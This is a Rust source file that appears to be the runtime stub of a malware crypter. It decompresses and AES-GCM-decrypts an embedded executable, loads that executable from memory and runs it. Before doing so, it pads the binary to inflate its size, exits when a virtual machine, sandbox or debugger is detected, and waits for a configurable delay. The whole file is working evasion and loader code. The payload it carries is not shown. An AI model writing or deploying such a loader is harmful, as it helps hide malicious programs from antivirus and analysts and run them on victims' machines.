mod generated;
use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, VM_DETECTION};

use aes_gcm::{Aes256Gcm, Key, Nonce, aead::{Aead, KeyInit}};

// Embedded at compile time by the crypter.
static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");
static PADDING: &[u8] = include_bytes!("../padding.bin");

fn vm_detected() -> bool {
    // WARNING: unreliable standalone VM/sandbox check.
    // The crate's heuristics can be outdated, bypassed, or produce
    // false negatives on modern or custom-configured VMs.
    antilysis::detected().unwrap_or(false)
}

fn debugger_detected() -> bool {
    // WARNING: unreliable standalone anti-debug check.
    // The crate's heuristics can be outdated, bypassed, or produce
    // false negatives on modern or custom-configured VMs.
    antidebug::is_debugger_present().unwrap_or(false)
}

fn decompress() -> Vec<u8> {
    zstd::decode_all(ENCRYPTED).expect("zstd decompress failed")
}

fn decrypt(ciphertext: &[u8]) -> Vec<u8> {
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&KEY));
    let plaintext = cipher.decrypt(Nonce::from_slice(&NONCE), ciphertext).expect("AES-GCM decrypt failed");
    if VERBOSE {
        println!("[INFO] Binary decrypted successfully.");
    }
    plaintext
}

fn execute(pe_bytes: &[u8]) {
    let module = maple_rs::Maple::load_executable_from_memory(pe_bytes).expect("maple load failed");
    module.execute_entry_point().expect("entry point failed");
    if VERBOSE {
        println!("[INFO] Target program executed.");
    }
}

fn delay_execution() {
    if DELAY_SECS > 0 {
        if VERBOSE {
            println!("[INFO] Delaying execution by {} seconds...", DELAY_SECS);
        }
        std::thread::sleep(std::time::Duration::from_secs(DELAY_SECS));
    }
}

fn main() {
    // Keep padding from being optimized out; it exists only to inflate size.
    std::hint::black_box(&PADDING);

    if VM_DETECTION && vm_detected() {
        if VERBOSE { println!("[INFO] VM detected. Exiting..."); }
        std::process::exit(0);
    }

    if debugger_detected() {
        if VERBOSE { println!("[INFO] Debugger detected. Exiting..."); }
        std::process::exit(0);
    }

    delay_execution();

    let ciphertext = decompress();
    let pe_bytes = decrypt(&ciphertext);
    execute(&pe_bytes);
}